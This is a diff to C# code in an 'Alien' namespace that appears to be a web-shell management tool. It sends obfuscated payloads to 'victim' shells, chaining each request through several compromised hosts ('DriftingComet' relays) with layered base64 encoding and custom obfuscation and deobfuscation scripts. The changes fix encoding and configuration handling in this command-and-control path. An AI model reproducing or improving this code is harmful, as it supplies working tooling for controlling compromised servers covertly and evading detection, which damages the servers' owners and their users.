@@ -627,9 +627,7 @@ namespace Alien
                 resp = await m_clnt.PostAsync(config.szUrl, content);
                 szRespContent = await resp.Content.ReadAsStringAsync();
 
-                //MessageBox.Show(szRespContent);
-
-                if (m_victim.ShellPayloadType == enPayloadType.OneShell)
+                if (config.payloadType == enPayloadType.OneShell)
                 {
                     foreach (var c in dicSplitter.Keys)
                     {
@@ -641,12 +639,16 @@ namespace Alien
                         if (c.bEHEnable)
                         {
                             szRespContent = await m_tamper.fnDeobfuscate(c.szEventHorizonScript, szRespContent, JsonSerializer.Deserialize<Dictionary<string, object>>(c.szEventHorizonConfig));
+
+                            s = szRespContent.Split(split);
+                            if (s.Length > 1)
+                                szRespContent = s[1];
                         }
                     }
 
-                    if (m_victim.m_ShellConfig.bEHEnable)
+                    if (config.bEHEnable && dicSplitter.Keys.Count == 0)
                     {
-                        MessageBox.Show("XXX");
+
                         var dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(m_victim.m_ShellConfig.szEventHorizonConfig);
                         if (dicParam == null)
                             throw new Exception("Invalid JSON string");
@@ -987,7 +989,8 @@ namespace Alien
                     .Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))
                     .Replace("[ENCODING]", m_victim.ShellEncoding);
 
-                szLoader = Uri.EscapeDataString(szLoader);
+                if (!config.bEHEnable)
+                    szLoader = Uri.EscapeDataString(szLoader);
 
                 szPayload = (config.bEHEnable ? string.Empty : $"{m_victim.ShellPassword}=") + szLoader + (config.bEHEnable ? string.Empty : $"&{szParams}");
                 if (config.bEHEnable)
@@ -1000,10 +1003,11 @@ namespace Alien
                 var configs = m_victim.m_ShellConfig.lsCometShellID.Select(x => m_sqlConn.fnGetShellConfig(x)).ToList();
                 configs.Reverse();
 
-                var result = await fnDriftingComet(configs, Uri.EscapeDataString(szPayload));
+                var result = await fnDriftingComet(configs, szPayload);
 
                 List<string> lsSplitter = result.lsSplitter;
                 lsSplitter.Reverse();
+                configs.Reverse();
 
                 Dictionary<stShellConfig, string> dicSplitter = new Dictionary<stShellConfig, string>();
 
@@ -1020,19 +1024,17 @@ namespace Alien
 
                     string szPass = result.szComet.Substring(0, idxFirstEq);
                     string szRealPayload = result.szComet.Substring(idxFirstEq + 1);
-
-                    szRealPayload = Uri.EscapeDataString(szRealPayload);
                     szFinalPayload = $"{szPass}={szRealPayload}";
                 }
                 else
                 {
-                    szFinalPayload = Uri.EscapeDataString(result.szComet);
+                    szFinalPayload = result.szComet;
                 }
 
                 return await fnHttpPOST(result.config, dicSplitter, szFinalPayload, szSplitter);
             }
 
-            return await fnHttpPOST(new stShellConfig(), new Dictionary<stShellConfig, string>(), szPayload, szSplitter);
+            return await fnHttpPOST(m_victim.m_ShellConfig, new Dictionary<stShellConfig, string>(), szPayload, szSplitter);
         }
 
         /// <summary>
@@ -1117,7 +1119,6 @@ namespace Alien
             string szFinalURL = string.Empty;
 
             List<string> lsSplitter = new List<string>();
-
             for (int i = 0; i < lsConfig.Count; i++)
             {
                 var config = lsConfig[i];
@@ -1131,31 +1132,46 @@ namespace Alien
 
                 string szNextUrl = i == 0 ? m_victim.ShellURL : lsConfig[i - 1].szUrl;
 
-                string szMergedComet = clsTamper.fnMergePayloadToOne(
-                    config,
-                    szCurrentTemplate,
-                    new string[] {
-                        clsEzData.fnszStre2b64(szNextUrl),
-                        clsEzData.fnszStre2b64(Uri.UnescapeDataString(szCurrentPayload))
-                    },
-                    config.language
-                );
-
-                string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod)
-                    .Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet))
-                    .Replace("[ENCODING]", config.szEncoding);
-
                 if (config.bEHEnable)
                 {
+                    string szMergedComet = clsTamper.fnMergePayloadToOne(
+                    config,
+                    szCurrentTemplate,
+                        new string[] {
+                            clsEzData.fnszStre2b64(szNextUrl),
+                            clsEzData.fnszStre2b64(szCurrentPayload)
+                        },
+                        config.language
+                    );
+
+                    string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod)
+                        .Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet))
+                        .Replace("[ENCODING]", config.szEncoding);
+
                     szCurrentPayload = await m_tamper.fnObfuscate(config.szEventHorizonScript, szCurrentLayer, JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig));
                 }
                 else
                 {
-                    szCurrentPayload = $"{szPassword}={szCurrentLayer}";
+                    string szMergedComet = clsTamper.fnMergePayloadToOne(
+                        config,
+                        szCurrentTemplate,
+                        new string[] {
+                            clsEzData.fnszStre2b64(szNextUrl),
+                            clsEzData.fnszStre2b64(szCurrentPayload)
+                        },
+                        config.language
+                    );
+
+                    string szCurrentLayer = m_dicDecodeFunc[config.language](config.szMethod)
+                        .Replace("[PATTERN]", clsEzData.fnszStre2b64(szMergedComet))
+                        .Replace("[ENCODING]", config.szEncoding);
+
+                    szCurrentPayload = $"{szPassword}={Uri.EscapeDataString(szCurrentLayer)}";
                 }
 
                 finalTargetConfig = config;
                 szFinalURL = config.szUrl;
+
                 lsSplitter.Add(szSplitter);
             }
 
